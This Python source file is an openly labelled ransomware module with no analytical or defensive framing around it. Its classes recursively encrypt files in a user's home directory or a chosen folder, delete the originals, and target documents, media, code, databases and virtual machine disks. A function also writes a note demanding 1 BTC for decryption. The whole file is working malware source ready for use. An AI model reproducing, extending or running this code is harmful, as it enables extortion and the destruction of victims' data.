# Ransomware Module
import os
import glob
import random
import string
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64

class Ransomware:
    def __init__(self, encryption_key: bytes = None):
        self.encryption_key = encryption_key or self._generate_key()
        self.cipher = Fernet(self.encryption_key)
        self.encrypted_files = []
        self.excluded_dirs = [
            '/proc', '/sys', '/dev', '/run',
            '/boot', '/lib', '/lib64',
            '/usr/lib', '/usr/lib64',
            '.rs_ransomware'
        ]
        self.excluded_extensions = [
            '.rs_enc', '.rs_lock', '.rs_key'
        ]
        
    def _generate_key(self) -> bytes:
        """Generate encryption key"""
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b"REVERSESHELL_RANSOM",
            iterations=100_000,
        )
        return base64.urlsafe_b64encode(kdf.derive(b"RANDOM_KEY_SEED"))
    
    def encrypt_file(self, filepath: str) -> bool:
        """Encrypt a single file"""
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            
            encrypted = self.cipher.encrypt(data)
            
            with open(filepath + '.rs_enc', 'wb') as f:
                f.write(encrypted)
            
            os.remove(filepath)
            self.encrypted_files.append(filepath)
            return True
        except Exception as e:
            print(f"Error encrypting {filepath}: {e}")
            return False
    
    def encrypt_directory(self, directory: str, recursive: bool = True):
        """Encrypt all files in a directory"""
        encrypted_count = 0
        
        if recursive:
            for root, dirs, files in os.walk(directory):
                # Skip excluded directories
                dirs[:] = [d for d in dirs if not any(ex in root for ex in self.excluded_dirs)]
                
                for file in files:
                    filepath = os.path.join(root, file)
                    
                    # Skip excluded extensions
                    if any(file.endswith(ext) for ext in self.excluded_extensions):
                        continue
                    
                    if self.encrypt_file(filepath):
                        encrypted_count += 1
        else:
            for file in os.listdir(directory):
                filepath = os.path.join(directory, file)
                if os.path.isfile(filepath):
                    if not any(file.endswith(ext) for ext in self.excluded_extensions):
                        if self.encrypt_file(filepath):
                            encrypted_count += 1
        
        return {
            "success": True,
            "encrypted_count": encrypted_count,
            "files": self.encrypted_files[-100:]  # Last 100 files
        }
    
    def encrypt_home(self):
        """Encrypt user's home directory"""
        home = str(Path.home())
        return self.encrypt_directory(home)
    
    def create_ransom_note(self, message: str = None):
        """Create ransom note"""
        note = message or f"""
=== YOUR FILES HAVE BEEN ENCRYPTED ===

To decrypt your files, contact us at:
ransom@darkweb.onion

Payment required: 1 BTC

Your unique ID: {self._generate_id()}

Do not rename or modify encrypted files!
"""
        
        note_path = Path.home() / 'READ_ME_FOR_DECRYPTION.txt'
        
        with open(note_path, 'w') as f:
            f.write(note)
        
        return {"success": True, "note_path": str(note_path)}
    
    def _generate_id(self) -> str:
        """Generate unique ransom ID"""
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
    
    def get_encryption_key(self) -> str:
        """Get the encryption key"""
        return self.encryption_key.decode()
    
    def decrypt_file(self, filepath: str) -> bool:
        """Decrypt a single file"""
        try:
            encrypted_path = filepath + '.rs_enc'
            
            if not os.path.exists(encrypted_path):
                return False
            
            with open(encrypted_path, 'rb') as f:
                encrypted_data = f.read()
            
            decrypted = self.cipher.decrypt(encrypted_data)
            
            with open(filepath, 'wb') as f:
                f.write(decrypted)
            
            os.remove(encrypted_path)
            return True
        except Exception as e:
            print(f"Error decrypting {filepath}: {e}")
            return False
    
    def decrypt_all(self):
        """Decrypt all encrypted files"""
        decrypted_count = 0
        
        for filepath in self.encrypted_files:
            if self.decrypt_file(filepath):
                decrypted_count += 1
        
        return {
            "success": True,
            "decrypted_count": decrypted_count
        }


class SelectiveRansomware:
    def __init__(self, encryption_key: bytes = None):
        self.rs = Ransomware(encryption_key)
        self.target_extensions = [
            # Documents
            '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx',
            # Images
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.raw',
            # Videos
            '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv',
            # Audio
            '.mp3', '.wav', '.flac', '.aac', '.ogg',
            # Archives
            '.zip', '.rar', '.7z', '.tar', '.gz',
            # Code
            '.py', '.js', '.java', '.c', '.cpp', '.h', '.html', '.css',
            # Databases
            '.sql', '.db', '.sqlite', '.mdb',
            # Virtual machines
            '.vmdk', '.vdi', '.vhdx',
            # Other
            '.psd', '.ai', '.eps', '.svg'
        ]
    
    def encrypt_targeted(self, directory: str):
        """Encrypt only targeted file types"""
        encrypted_count = 0
        
        for root, dirs, files in os.walk(directory):
            # Skip excluded directories
            if any(ex in root for ex in self.rs.excluded_dirs):
                continue
            
            for file in files:
                # Check if file has target extension
                if any(file.lower().endswith(ext) for ext in self.target_extensions):
                    filepath = os.path.join(root, file)
                    if self.rs.encrypt_file(filepath):
                        encrypted_count += 1
        
        return {
            "success": True,
            "encrypted_count": encrypted_count
        }


def encrypt_files(directory: str):
    """Quick file encryption function"""
    rs = Ransomware()
    return rs.encrypt_directory(directory)


def create_ransom_note(message: str = None):
    """Quick ransom note creation function"""
    rs = Ransomware()
    return rs.create_ransom_note(message)
